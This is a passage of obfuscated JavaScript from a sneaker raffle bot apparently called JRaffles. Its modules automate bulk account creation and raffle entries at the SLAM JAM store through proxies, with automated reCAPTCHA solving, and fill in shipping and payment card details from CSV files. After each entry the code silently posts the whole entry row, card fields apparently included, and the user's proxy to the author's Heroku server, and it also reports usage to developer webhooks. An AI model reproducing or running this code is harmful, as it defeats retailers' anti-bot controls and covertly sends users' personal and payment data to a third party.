                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Retrying\x20(' + _0x4b8079 + '\x20/\x205)')), _0x1dc8da = _0x1dc8da - 0x1, _0x4b8079 = _0x4b8079 + 0x1;
                                continue;
                            }
                            _0x29c6ec == 'yes' && _0x4b8079 >= 0x5 && (_0x4af7c0(_0x29063f[_0x1dc8da], _0x529700), _0x29c6ec = 'no', _0x4b8079 = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x5c26de, _0x21c6d7, _0x577445) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20d61c = 0x0; _0x20d61c < _0x21c6d7['length']; _0x20d61c++) {
                        if (_0x398cb6 != 'yes')
                            var _0x398cb6 = '', _0x2a2580 = 0x0;
                        var _0x1cbb19 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4b3861
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8aa917['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xe2f4c8
                                }
                            ]
                        }];
                        const _0x3a5eca = { 'embeds': _0x1cbb19 };
                        _0x299f70(_0x5c26de['name'] + '\x20Task\x20' + (_0x20d61c + 0x1) + '\x20/\x20' + _0x21c6d7['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        try {
                            await _0x4669df(_0x21c6d7, _0x20d61c);
                        } catch {
                            _0x398cb6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x27049d = await _0xe56989(_0x21c6d7[_0x20d61c], _0x5c26de, 'acc', ![]);
                        const _0xda03c6 = { 'succesDEVMSG': { 'embeds': [_0x27049d] } };
                        if (_0x21c6d7[_0x20d61c]['Email'] == '' || _0x21c6d7[_0x20d61c]['FirstName'] == '' || _0x21c6d7[_0x20d61c]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x32344d(0x7d0);
                            continue;
                        }
                        (_0x21c6d7[_0x20d61c]['Password'] == '' || _0x21c6d7[_0x20d61c] == undefined) && _0x21c6d7[_0x20d61c]['Password'] == 'JRaffles23!';
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x43df62 = _0x577445[_0x20d61c]['split'](':');
                        else
                            var _0x386c55 = Math['round'](Math['random']() * (_0x577445['length'] - 0x1)), _0x43df62 = _0x577445[_0x386c55]['split'](':');
                        var _0x50651b;
                        try {
                            _0x50651b = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x43df62[0x0] + ':' + _0x43df62[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x50651b = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x43df62[0x0] + ':' + _0x43df62[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xe02056 = await _0x50651b['newPage']();
                            await _0xe02056['authenticate']({
                                'username': '' + _0x43df62[0x2],
                                'password': '' + _0x43df62[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Getting\x20Session'), await _0xe02056['setRequestInterception'](!![]), _0xe02056['on']('request', _0x39092c => {
                                _0x39092c['resourceType']() === 'image' || _0x39092c['resourceType']() === 'font' || _0x39092c['resourceType']() === 'media' ? _0x39092c['abort']() : _0x39092c['continue']();
                            }), await _0xe02056['goto']('https://drop.slamjam.com/account/register'), await _0x32344d(0xbb8), await _0xe02056['waitForSelector']('#FirstName'), await _0xe02056['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xe02056['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Filling\x20information'), await _0x32344d(0x4b0), await _0xe02056['type']('#FirstName', '' + _0x21c6d7[_0x20d61c]['FirstName']), await _0x32344d(0x226), await _0xe02056['type']('#LastName', '' + _0x21c6d7[_0x20d61c]['LastName']), await _0x32344d(0x226), await _0xe02056['type']('#Email', '' + _0x21c6d7[_0x20d61c]['Email']), await _0x32344d(0x2ee), await _0xe02056['type']('#ConfirmEmail', '' + _0x21c6d7[_0x20d61c]['Email']), await _0x32344d(0x2ee), await _0xe02056['type']('#CreatePassword', '' + _0x21c6d7[_0x20d61c]['Password']), await _0x32344d(0x2ee), await _0xe02056['type']('#CreateConfirmPassword', '' + _0x21c6d7[_0x20d61c]['Password']), await _0x32344d(0x226), console['log'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Submitting..'), await _0xe02056['$eval']('#create_customer', _0x48eda6 => _0x48eda6['submit']()), await _0x32344d(0x1388), console['log'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20' + _0x5b4136['cyan']('Solving\x20Captcha')), await _0xe02056['solveRecaptchas'](), console['log'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xe02056['$eval']('.shopify-challenge__container\x20>\x20form', _0x170746 => _0x170746['submit']());
                            try {
                                await _0xe02056['waitForSelector']('.product-card__image'), await _0x32344d(0x1f4), _0x398cb6 = 'no', console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Account\x20' + _0x21c6d7[_0x20d61c]['Email'] + '\x20Generated!')), _0x4fe38c['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x21c6d7[_0x20d61c]['Email'] + ',' + _0x21c6d7[_0x20d61c]['Password']), console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Account\x20' + _0x21c6d7[_0x20d61c]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0xda03c6['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16e110(_0x410b1d, _0xda03c6['succesDEVMSG']);
                            } catch (_0x565c48) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x565c48));
                            }
                        } catch (_0x2744c9) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20' + _0x2744c9));
                        } finally {
                            _0x50651b && _0x50651b['close']();
                            if (_0x398cb6 == 'yes' && _0x2a2580 != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x5c26de['name'] + ']\x20Task\x20' + (_0x20d61c + 0x1) + '\x20:\x20Retrying\x20(' + _0x2a2580 + '\x20/\x205)')), _0x20d61c = _0x20d61c - 0x1, _0x2a2580 = _0x2a2580 + 0x1;
                                continue;
                            }
                            _0x398cb6 == 'yes' && _0x2a2580 >= 0x5 && (_0x4af7c0(_0x21c6d7[_0x20d61c], _0x5c26de), _0x398cb6 = 'no', _0x2a2580 = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3fb20e, _0x523fff, _0x25ddcd) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x426535 = 0x0; _0x426535 < _0x523fff['length']; _0x426535++) {
                        var _0x1e3792;
                        if (_0x57542b != 'yes')
                            var _0x57542b = '', _0x3726d4 = 0x0;
                        _0x299f70(_0x3fb20e['name'] + '\x20Task\x20' + (_0x426535 + 0x1) + '\x20/\x20' + _0x523fff['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        try {
                            await _0x4669df(_0x523fff, _0x426535);
                        } catch {
                            _0x57542b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x523fff[_0x426535]['Email'] == '' || _0x523fff[_0x426535]['Password'] == '' || _0x523fff[_0x426535]['FirstName'] == '' || _0x523fff[_0x426535]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x2d3e06 = _0x25ddcd[_0x426535]['split'](':');
                        else
                            var _0x54219e = Math['round'](Math['random']() * (_0x25ddcd['length'] - 0x1)), _0x2d3e06 = _0x25ddcd[_0x54219e]['split'](':');
                        var _0x12341b;
                        try {
                            _0x12341b = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d3e06[0x0] + ':' + _0x2d3e06[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x12341b = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x2d3e06[0x0] + ':' + _0x2d3e06[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5873c7 = await _0x12341b['newPage']();
                            await _0x5873c7['authenticate']({
                                'username': '' + _0x2d3e06[0x2],
                                'password': '' + _0x2d3e06[0x3]
                            }), await _0x5873c7['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5873c7['setRequestInterception'](!![]), _0x5873c7['on']('request', _0x2c0c5d => {
                                _0x2c0c5d['resourceType']() === 'image' || _0x2c0c5d['resourceType']() === 'font' || _0x2c0c5d['resourceType']() === 'media' ? _0x2c0c5d['abort']() : _0x2c0c5d['continue']();
                            }), await _0x5873c7['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5873c7['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5873c7['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x32344d(0x258), await _0x5873c7['waitForSelector']('#CustomerEmail'), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5873c7['type']('#CustomerEmail', '' + _0x523fff[_0x426535]['Email']), await _0x32344d(0x12c), await _0x5873c7['type']('#CustomerPassword', '' + _0x523fff[_0x426535]['Password']), await _0x32344d(0x226), await _0x5873c7['$eval']('#customer_login', _0x1b53e6 => _0x1b53e6['submit']()), await _0x32344d(0x7d0), await _0x5873c7['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20' + _0x5b4136['cyan']('Solving\x20Captcha')), await _0x5873c7['solveRecaptchas'](), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x5873c7['$eval']('.shopify-challenge__container\x20>\x20form', _0x30c82e => _0x30c82e['submit']());
                            try {
                                await _0x5873c7['waitForSelector']('.nav-account'), await _0x32344d(0x4b0);
                            } catch {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x5873c7['goto']('' + _0x523fff[_0x426535]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x32344d(0xbb8), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x5873c7['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x5873c7['click']('.product-select-variant-wrapper'), await _0x32344d(0x320), await _0x5873c7['click']('li.product-select-variant__value[data-size=\x22' + _0x523fff[_0x426535]['Size'] + '\x22]'), await _0x32344d(0x384), await _0x5873c7['$eval']('#AddToCartForm-product-template-raffle', _0x137cb4 => _0x137cb4['submit']()), await _0x5873c7['waitForSelector']('.cart-order-summary__content'), await _0x32344d(0x514), await _0x5873c7['goto']('https://drop.slamjam.com/checkout'), await _0x32344d(0x514), await _0x5873c7['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5873c7['select']('#checkout_shipping_address_country', '' + _0x523fff[_0x426535]['Country']), await _0x32344d(0x200), await _0x5873c7['waitForSelector']('#checkout_shipping_address_first_name'), await _0x5873c7['type']('#checkout_shipping_address_first_name', '' + _0x523fff[_0x426535]['FirstName']), await _0x32344d(0x237), await _0x5873c7['type']('#checkout_shipping_address_last_name', '' + _0x523fff[_0x426535]['LastName']), await _0x32344d(0x1e0), await _0x5873c7['type']('#checkout_shipping_address_address1', _0x523fff[_0x426535]['Address1'] + '\x20' + _0x523fff[_0x426535]['HouseNumber']), await _0x32344d(0x514), await _0x5873c7['type']('#checkout_shipping_address_address2', '' + _0x523fff[_0x426535]['Address2']), await _0x32344d(0x514);
                            _0x523fff[_0x426535]['Postcode'] == undefined && (_0x523fff[_0x426535]['Postcode'] = _0x523fff[_0x426535]['Zip']);
                            await _0x5873c7['type']('#checkout_shipping_address_zip', '' + _0x523fff[_0x426535]['Postcode']), await _0x32344d(0x2bc), await _0x5873c7['type']('#checkout_shipping_address_city', '' + _0x523fff[_0x426535]['City']), await _0x32344d(0x320), await _0x5873c7['type']('#checkout_shipping_address_phone', '' + _0x523fff[_0x426535]['Phone']), await _0x32344d(0x320), await _0x5873c7['click']('#continue_button'), await _0x32344d(0xbb8), await _0x5873c7['waitForSelector']('.summary-title'), await _0x32344d(0x320), await _0x5873c7['click']('#continue_button'), await _0x32344d(0x320), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x5873c7['waitForSelector']('#checkout_credit_card_vault'), await _0x32344d(0x3e8);
                            var _0x4c794e = await _0x5873c7['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x171489 = await _0x4c794e['contentFrame']();
                            await _0x171489['click']('#number'), await _0x32344d(0x3e8), await _0x171489['type']('#number', '' + _0x523fff[_0x426535]['CardNumber'], { 'delay': 0x78 }), _0x4c794e = await _0x5873c7['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x171489 = await _0x4c794e['contentFrame'](), await _0x32344d(0x1c2), await _0x171489['click']('#name'), await _0x32344d(0x1f4), await _0x171489['type']('#name', '' + _0x523fff[_0x426535]['NameOnCard'], { 'delay': 0x78 }), _0x4c794e = await _0x5873c7['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x171489 = await _0x4c794e['contentFrame'](), await _0x32344d(0x1c2), await _0x171489['click']('#expiry'), await _0x32344d(0x1f4), await _0x171489['type']('#expiry', '' + _0x523fff[_0x426535]['ExpiryDate'], { 'delay': 0x78 }), _0x4c794e = await _0x5873c7['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x171489 = await _0x4c794e['contentFrame'](), await _0x32344d(0x1c2), await _0x171489['click']('#verification_value'), await _0x32344d(0x1f4), await _0x171489['type']('#verification_value', '' + _0x523fff[_0x426535]['CVV'], { 'delay': 0x78 }), await _0x5873c7['$eval']('#accepts-flag-raffle', _0x3bbe72 => _0x3bbe72['click']()), await _0x32344d(0x7d0), console['log'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x5873c7['$eval']('#continue_button', _0x129f0c => _0x129f0c['click']()), await _0x32344d(0x1b58), await _0x5873c7['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x5873c7['$eval']('.edit_checkout.animate-floating-labels', _0xa6065f => _0xa6065f['submit']()), await _0x32344d(0x7d0);
                            try {
                                await _0x5873c7['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x57542b = 'no', _0x5677a4(_0x523fff[_0x426535], _0x3fb20e), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0xc7dbfe) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0xc7dbfe['message']);
                            }
                            var _0x1b5269 = await _0xe56989(_0x523fff[_0x426535], _0x3fb20e, 'dev', ![]), _0x44b9bf = await _0xe56989(_0x523fff[_0x426535], _0x3fb20e, 'pub', ![]);
                            let _0x11ba37 = _0x523fff[_0x426535];
                            try {
                                prxdata = {
                                    'username': _0x4b3861['replace']('#', ''),
                                    'module': _0x3fb20e['name'],
                                    'entrydata': JSON['stringify'](_0x11ba37),
                                    'proxy': '' + _0x25ddcd[_0x426535]
                                };
                                var _0x3716ed = JSON['stringify'](prxdata);
                                let _0x5b1fa0 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x3716ed, _0x5b1fa0);
                            } catch (_0x161edd) {
                            }
                            const _0x5eeb29 = {
                                'succesDEVMSG': { 'embeds': [_0x1b5269] },
                                'succesPUBMSG': { 'embeds': [_0x44b9bf] }
                            };
                            try {
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x5eeb29['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x5eeb29['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x583375, _0x5eeb29['succesPUBMSG']);
                            } catch (_0xa21e79) {
                                console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xa21e79));
                            }
                        } catch (_0x3840a1) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20' + _0x3840a1)), _0x1e3792 = '' + _0x3840a1;
                            var _0x221ac4 = await _0xe56989(kickz[_0x426535], _0x3fb20e, 'dev', !![], _0x1e3792);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x221ac4] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], EMBEDS['errorDEV']), await _0x16e110(_0x3ba800, EMBEDS['errorDEV']), _0x57542b = 'yes';
                        } finally {
                            _0x12341b && _0x12341b['close']();
                            if (_0x57542b == 'yes' && _0x3726d4 != 0x5 && _0x1e3792 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x3fb20e['name'] + ']\x20Task\x20' + (_0x426535 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3726d4 + '\x20/\x205)')), _0x426535 = _0x426535 - 0x1, _0x3726d4 = _0x3726d4 + 0x1;
                                continue;
                            }
                            _0x57542b == 'yes' && _0x3726d4 >= 0x5 && (_0x4af7c0(_0x523fff[_0x426535], _0x3fb20e), _0x57542b = 'no', _0x3726d4 = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x14b8c1) {
                    var _0x45859c = await _0x278dd0(), _0x1674ad = _0x4fe38c['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x107d49 = _0x1d9836['parse'](_0x1674ad, { 'header': !![] })['data'];
                    for (var _0x4e5846 = 0x0; _0x4e5846 < _0x107d49['length']; _0x4e5846++) {
                        var _0x382f21 = _0x107d49[_0x4e5846]['Store'], _0x4b1028 = _0x107d49[_0x4e5846]['Mode'];
                        for (var _0x1d26a2 of _0x502cc7) {
                            const _0x3763bc = _0x1d26a2['name']['includes'](_0x382f21);
                            if (!_0x3763bc)
                                continue;
                            for (mode of _0x1d26a2['modules']) {
                                if (mode['name'] == _0x4b1028) {
                                    console['log']('Running\x20' + _0x5b4136['cyan'](mode['name'])), await mode['function'](mode, [_0x107d49[_0x4e5846]], _0x45859c);
                                    var _0x5f37de = _0x1674ad['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x4fe38c['writeFileSync']('../failed-tasks.csv', _0x5f37de);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x5444d5 = await _0x4adce7['get']('Answer');
                    if (_0x5444d5['Answer']['toLowerCase']() == 'y') {
                        _0x4fe38c['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x32344d(0x3e8);
                        return;
                    }
                    if (_0x5444d5['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x32344d(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x32344d(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x161bb9(_0x1e73ff) {
    var _0x39ce68 = await _0x278dd0(), _0x302592 = _0x4fe38c['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x233564 = _0x1d9836['parse'](_0x302592, { 'header': !![] })['data'];
    for (var _0x42dc84 = 0x0; _0x42dc84 < _0x233564['length']; _0x42dc84++) {
        var _0x234f27 = _0x233564[_0x42dc84]['Store'], _0xb9c271 = _0x233564[_0x42dc84]['Mode'];
        for (var _0x498f8d of _0x502cc7) {
            const _0x51f5ba = _0x498f8d['name']['includes'](_0x234f27);
            if (_0x51f5ba)
                for (mode of _0x502cc7[_0x498f8d]['modules']) {
                    const _0x38517e = mode['name']['includes'](_0xb9c271);
                    _0x38517e && (_0x1e73ff = mode['name'], await mode['function'](_0x1e73ff, _0x233564[_0x42dc84], _0x39ce68));
                }
        }
    }
}
async function _0x56f378() {
    await _0xbe10e3(), console['clear']();
    if (_0xe2f4c8 != 'devkey') {
        let _0x408c70 = await _0x1e6952['autoUpdate']();
        if (_0x408c70 === 'yes')
            return _0x7709da('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x462202 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x32344d(0x2710);
        ;
    }
    await _0x285138(_0x462202);
    if (_0x57a1bf === ![])
        return console['log']('Closing\x20Browser'), await _0x32344d(0xbb8);
    else
        try {
            var _0x3a5b38 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x4b3861
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0xe2f4c8
                    }
                ]
            }];
            const _0x59d4c6 = { 'embeds': _0x3a5b38 };
            var _0x3f72ae = await _0xe56989(null, null, 'open', ![]);
            const _0x3aebe5 = { 'openDEVMSG': { 'embeds': [_0x3f72ae] } };
            await _0x16e110(_0x393d40, _0x3aebe5['openDEVMSG']);
            async function _0x21c2a3() {
                _0x299f70('JRaffles\x20' + _0xe2f4c8), console['clear'](), console['log']('Hello\x20' + _0x5b4136['cyan']('' + _0x4b3861) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0xe2f4c8), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x5a1074 = 0x0; _0x5a1074 < _0x502cc7['length'] - 0x4; _0x5a1074++) {
                    if (_0x5a1074 >= 0xa) {
                        console['log']('\x20(' + _0x5a1074 + ')\x20[' + _0x502cc7[_0x5a1074]['name'] + ']');
                        continue;
                    }
                    if (_0x502cc7[_0x5a1074]['name'] === 'Reload\x20Settings' || _0x502cc7[_0x5a1074]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x5a1074 + ')\x20\x20[' + _0x502cc7[_0x5a1074]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x502cc7['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x502cc7['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x502cc7['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x502cc7['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2d9eb7();
                if (taskModule > _0x502cc7['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x32344d(0x3e8), _0x21c2a3();
                if (_0x502cc7[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x2f4b88(_0x502cc7[taskModule]['modules']);
                    var _0x25df63 = _0x502cc7[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x32a34e = await _0x278dd0();
                            await _0x25df63['function'](_0x25df63, _0x32a34e);
                        }
                        if (taskFunction == 0x2) {
                            var _0x32a34e = await _0x278dd0(), _0x4c30c5 = await _0x3ac6d3(_0x25df63);
                            _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x4c30c5), await _0x25df63['function'](_0x25df63, _0x4c30c5, _0x32a34e);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x32a34e = await _0x278dd0(), _0x4c30c5 = await _0x3ac6d3(_0x25df63);
                                _0x8aa917['shuffleTasks'] && await _0x3269e5(_0x4c30c5), await _0x25df63['function'](_0x25df63, _0x4c30c5, _0x32a34e);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x32a34e = await _0x278dd0();
                                    await _0x25df63['function'](_0x25df63, _0x32a34e);
                                }
                            }
                        }
                    } catch (_0x133c81) {
                        console['log'](_0x133c81), await _0x32344d(0x7d0);
                    }
                    return _0x21c2a3();
                }
